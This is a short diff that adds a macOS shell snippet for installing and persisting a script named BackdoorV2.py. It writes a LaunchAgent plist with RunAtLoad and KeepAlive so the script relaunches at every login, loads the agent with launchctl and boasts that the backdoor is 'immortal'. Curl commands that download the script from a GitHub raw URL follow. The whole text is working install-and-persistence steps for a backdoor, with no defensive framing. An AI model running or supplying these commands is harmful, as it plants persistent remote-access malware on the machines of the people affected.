@@ -1,3 +1,30 @@
+# 1. Create the immortal service for BackdoorV2.py
+cat > ~/Library/LaunchAgents/backdoorv2-forever.plist <<EOF
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key><string>backdoorv2-forever</string>
+    <key>ProgramArguments</key><array><string>/usr/bin/python3</string><string>$HOME/BackdoorV2.py</string></array>
+    <key>RunAtLoad</key><true/>
+    <key>KeepAlive</key><true/>
+    <key>WorkingDirectory</key><string>$HOME</string>
+</dict>
+</plist>
+EOF
+
+# 2. Load it now + forever
+launchctl load ~/Library/LaunchAgents/backdoorv2-forever.plist
+launchctl load -w ~/Library/LaunchAgents/backdoorv2-forever.plist
+
+# 3. Done
+echo "BackdoorV2.py is now immortal until you delete the file itself"
+
+
+
+
+
+
 run: curl -O https://raw.githubusercontent.com/OPUNstopped/OPUNbackdoor_V2/main/BackdoorV2.py
 Run and put in directitory: mkdir -p "Desktop File" && curl -O --output-dir "Desktop File" https://raw.githubusercontent.com/OPUNstopped/OPUNbackdoor_V2/main/BackdoorV2.py
 
